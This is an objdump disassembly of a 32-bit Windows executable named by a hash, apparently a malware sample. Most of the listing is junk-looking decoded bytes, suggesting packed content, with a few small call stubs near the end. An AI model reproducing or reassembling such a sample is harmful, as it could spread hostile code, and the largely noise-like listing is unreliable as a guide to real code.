
554d7af9b72ff7dbacab5dadb287434423fb40bf8404d7e851bad18c78da5726.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	jbe    0x4d004d
  4d0002:	imul   ebx,DWORD PTR [eax-0x3e],0x48ce752f
  4d0009:	mov    ecx,0xf1c41c06
  4d000e:	scas   eax,DWORD PTR es:[edi]
  4d000f:	div    BYTE PTR [eax]
  4d0011:	and    eax,0x640cf57c
  4d0016:	enter  0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	mov    ds:0xdcf082fc,al
  4d06c5:	push   0x76f27783
  4d06ca:	pop    esp
  4d06cb:	jmp    0x4d0747
  4d06cd:	xchg   ebx,eax
  4d06ce:	fnstcw WORD PTR [edi]
  4d06d0:	and    BYTE PTR [esi+0x28de0852],bh
  4d06d6:	arpl   WORD PTR [eax+edx*2+0x41],dx
  4d06da:	imul   edi,DWORD PTR [edx-0x3e],0x8b74baf
  4d06e1:	clc    
  4d06e2:	adc    eax,0xe86389ac
  4d06e7:	jnp    0x4d0694
  4d06e9:	out    0xd4,al
  4d06eb:	mov    WORD PTR [ebx-0x1374aa01],cs
  4d06f1:	sub    esp,0x58
  4d06f4:	lea    eax,[esi+0xc]
  4d06f7:	or     DWORD PTR [eax+0xcc],0x6eaf
  4d0701:	push   eax
  4d0702:	push   0x0
  4d0704:	call   0x4d0df8
  4d0709:	add    esp,0x4
  4d070c:	pop    eax
  4d070d:	push   eax
  4d070e:	push   DWORD PTR [eax+0x44]
  4d0711:	push   esi
  4d0712:	push   DWORD PTR [eax+0x1d4]
  4d0718:	call   0x4d1268
  4d071d:	add    esp,0xc
  4d0720:	pop    eax
  4d0721:	push   eax
  4d0722:	call   0x4d07a8
  4d0727:	add    esp,0x4
  4d072a:	pop    eax
  4d072b:	add    esp,0x58
  4d072e:	pop    ebp
  4d072f:	ret    
  4d0730:	mov    edi,edi
  4d0732:	push   ebp
  4d0733:	mov    ebp,esp
  4d0735:	sub    esp,0x3c
  4d0738:	lea    edx,ds:0x4d30d4
  4d073e:	and    ecx,ebx
  4d0740:	push   edx
  4d0741:	push   0x0
  4d0743:	call   0x4d0cb4
  4d0748:	add    esp,0x4
  4d074b:	pop    edx
  4d074c:	push   edx
  4d074d:	push   DWORD PTR [edx+0xa8]
  4d0753:	push   DWORD PTR [edx+0x88]
  4d0759:	push   DWORD PTR [edx+0x198]
  4d075f:	call   0x4d12c8
  4d0764:	add    esp,0xc
  4d0767:	pop    edx
  4d0768:	push   edx
  4d0769:	lea    edx,[edx-0xd4]
  4d076f:	push   edx
  4d0770:	call   0x4d08d4
  4d0775:	add    esp,0x4
  4d0778:	test   eax,eax
  4d077a:	jne    0x4d0769
  4d077c:	pop    edx
  4d077d:	add    esp,0x3c
  4d0780:	pop    ebp
  4d0781:	ret    
  4d0782:	add    BYTE PTR [eax],al
  4d0784:	pop    edi
  4d0785:	call   DWORD PTR ds:0x4d2018
  4d078b:	call   edi
  4d078d:	add    BYTE PTR [eax],al
  4d078f:	add    BYTE PTR [edi-0x1],bl
  4d0792:	adc    eax,0x4d207c
  4d0797:	call   edi
  4d0799:	add    BYTE PTR [eax],al
  4d079b:	add    BYTE PTR [edi-0x1],bl
  4d079e:	adc    eax,0x4d20a0
